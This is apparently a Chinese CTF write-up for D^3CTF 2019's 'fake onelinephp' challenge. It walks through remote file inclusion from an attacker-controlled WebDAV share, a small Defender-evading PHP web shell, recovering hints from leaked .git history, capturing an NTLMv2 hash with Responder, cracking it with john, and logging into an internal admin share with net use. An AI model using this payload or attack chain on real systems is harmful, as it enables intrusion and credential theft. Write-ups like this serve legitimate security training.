# fake onelinephp

## 题目简述

题目入口是一个 Windows 环境下的 one-line-php 文件包含点。利用点不在 PHP 代码本身的复杂逻辑，而在 Windows 服务器开启了 WebClient，能够通过 WebDAV/SMB 风格路径远程包含攻击者控制的 PHP 文件。拿到 Web shell 后，需要从泄露的 `.git` 历史中恢复提示和字典，再对内网目标进行凭据爆破或 NTLM hash 捕获，最终使用得到的账号访问内网 flag 所在机器。

题目资料地址：https://github.com/w1ndseek2/My-CTF-Challenges

题目资料对应目录为 `D^3CTF-2019-fakeonelinephp`，包含外网 `server1` 和内网 `server2` 两部分。`description.txt` 只给出题名，没有额外题面；附件结构能看出题目分成外网 one-line PHP 文件包含入口和内网服务两个阶段，因此正文中的 WebDAV 远程包含、`.git` 恢复提示、再进入内网爆破/抓 hash 是完整利用链，而不是单纯的 PHP 代码审计题。

## 解题过程

打开题目就是 orange 的 one-line-php，这里的目的只是为了给一个文件包含点。原题预期解需要知道临时文件路径，但在 Windows 环境中可以走远程包含。

因为xx云会封smb，所以题目服务器开了webclient，启动一个webdav server，远程文件包含rce，payload 形态如下：

```text
TARGET_URL?orange=\\<attacker-ip>\webdav\shell.php
```
(看wp有的队伍用smb也成功了，emmm挠头.jpg

在远程文件包含的时候因为 Windows Defender 会杀，所以 shell 需要做一点规避，免杀方法很多，例如：

```php
@<?php
system(file_get_contents("php://input"));?>
```

进去发现web目录下只有index.php，webdav目录和.git目录，webdav是空的，只是想提示一下开了webclient，所以就剩下.git了。此处考察git使用，大黑阔们日常使用的git hack只能恢复出naive，用 `git reflog` + `git reset` 恢复出 ~~两篇浮生日记~~ hint2.txt和dict.txt  

从0ops师傅那里学到了一个工具，能够直接恢复出来 [Git_Extract](https://github.com/gakki429/Git_Extract)。这类工具的作用是遍历泄露的 `.git/objects`、引用和日志，把当前工作树以及 reflog 中还能还原的历史文件导出；不用工具时也可以手动执行 `git reflog` 找到历史提交，再 `git reset` 或 `git checkout` 对应对象恢复 `hint2.txt` 和 `dict.txt`。

hin2.txt

`hint2.txt` 的核心信息是：内网 Windows 主机上有 flag，密码藏在 `dict.txt` 的某一行中；只需要找出正确行号或用字典爆破即可。

dict.txt


hint2.txt给出了flag的位置，在内网的机器上，给了密码字典，爆破一下就能拿到明文了，这一步也没有说什么唯一解，所以把几种解法都贴一下：

1. 丢hydra上去爆破
2. 转发出来爆破

看到师傅们基本都是前两种方法，其实在出题的时候想过限制爆破，但是多个队用的是同一套环境，有人搅屎的话就很蛋疼了，所以作罢

1. 拿hash用john爆破

这种方法毕竟动静比较小嘛

找个工具接收一下hash `python2 Responder.py -I eth0 -f`

```bash
python2 Responder.py -I eth0 -f
```

Responder 能捕获到 `Administrator` 的 NTLMv2 hash。

然后丢给john爆破一下就出来了

```bash
john ntlmv2.txt --wordlist=dict.txt
```

John 使用 `netntlmv2` 格式和 `dict.txt` 字典命中密码，截图中的命中值为 `U2TTvY6ugslV`。

有密码了rdp或者net use都可以啦

```cmd
net use \\172.19.97.8\C$ /user:Administrator <password>
type \\172.19.97.8\C$\Users\Administrator\Desktop\flag.txt
```

补充现象：

在看wp的时候发现

这是因为前面做出来的队没有删ipc链接

其实我看到很多队伍传上来的工具都故意没有删，比如hydra，打包好的html.zip

这说明共享环境中前序队伍留下的 IPC 连接、工具包或假文件可能影响后续解题判断，复现时应优先验证自己拿到的信息来源。

## 方法总结

- 核心技巧：Windows PHP 文件包含可以结合 WebClient/WebDAV 做远程文件包含，拿 shell 后通过 `.git` 历史恢复提示，再进入内网凭据攻击。
- 识别信号：Web 根目录存在 `.git`、空的 `webdav` 目录、Windows 目标和包含点同时出现时，应优先检查 WebDAV/SMB 包含和 Git 历史恢复。
- 复用要点：Windows Defender 会影响落地 shell，payload 应尽量短并按实际防护调整；内网阶段可以用 Hydra/转发爆破，也可以捕获 NTLM hash 后用 John 离线爆破，后者动静更小。
